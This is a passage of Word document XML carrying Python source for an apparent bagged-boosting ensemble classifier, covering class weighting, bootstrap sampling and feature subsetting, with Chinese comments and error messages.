          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6312A454">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        counts = np.bincount(y_enc, minlength=int(y_enc.max()) + 1).astype(np.float64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F86D420">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if cw == "balanced":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50361481">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            per_class = len(y_enc) / (counts.size * np.maximum(counts, 1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D82982">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return per_class[y_enc]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F03956D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if isinstance(cw, dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="264A283F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return np.array([cw[c] for c in y_enc], dtype=np.float64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28CDF9D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise ValueError(f"不支持的 class_weight：{cw!r}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2267F3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3393C9F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ------------------------------------------------------------------- 训练</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC1060D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20AC4F3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def fit(self, X, y):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E922EA9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if self.base_depth &gt; self.max_depth:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111E9747">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise ValueError(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF0E5F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"base_depth={self.base_depth} 超过 max_depth={self.max_depth}："</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE3FA4A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "提升器内部必须是浅树，深树会让提升轮次没有残差可学"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C75C287">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4591324C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="262FEB1A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X = self._validate_X(X)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6815575F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        y = np.asarray(y)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341BD2BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.n_features_in_ = X.shape[1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6179F498">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48D9C09B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._le = LabelEncoder().fit(y)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C8DB03">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        y_enc = self._le.transform(y).astype(np.int32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E44398">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.classes_ = self._le.classes_</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BCC360">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_classes = len(self.classes_)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1FB14A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_samples, n_features = X.shape</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26304697">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A5024AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rng = np.random.RandomState(self.random_state)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A44CC61">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_sub = self._resolve_max_features(n_features)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2A3C06">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        kinds = self._draw_kinds(rng)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE34E3C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        weights = self._sample_weight(y_enc)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="221BAB8E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CF90271">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.estimators_ = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE9462A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.feature_indices_ = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F713380">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.member_classes_ = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5266863E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.learner_kinds_ = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0C82D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.skipped_ = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58846796">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B194FF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for i, kind in enumerate(kinds):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A95AB1D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            seed = int(rng.randint(0, 2**31 - 1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349CE5A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            boot = rng.randint(0, n_samples, size=n_samples)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611C4244">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            feats = np.sort(rng.choice(n_features, size=n_sub, replace=False))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E97BBCF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            y_sub = y_enc[boot]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04576BA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63DCC494">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            member_le = LabelEncoder().fit(y_sub)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40621536">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if len(member_le.classes_) &lt; 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D097D6B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.skipped_.append((i, kind, "bootstrap 样本只有单一类别"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7608DF38">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58FE8BA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5831EE3F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            est = _build_booster(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33201895">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                kind,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A8A438">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                rounds=self.base_rounds,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0B5D8F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                depth=self.base_depth,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5990BDDA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                overrides=(self.base_overrides or {}).get(kind),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472E35A6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                seed=seed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C0D8B4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                n_jobs=self.n_jobs,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1011717D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA9084A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            fit_kwargs = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA31ADE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if weights is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CD99BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
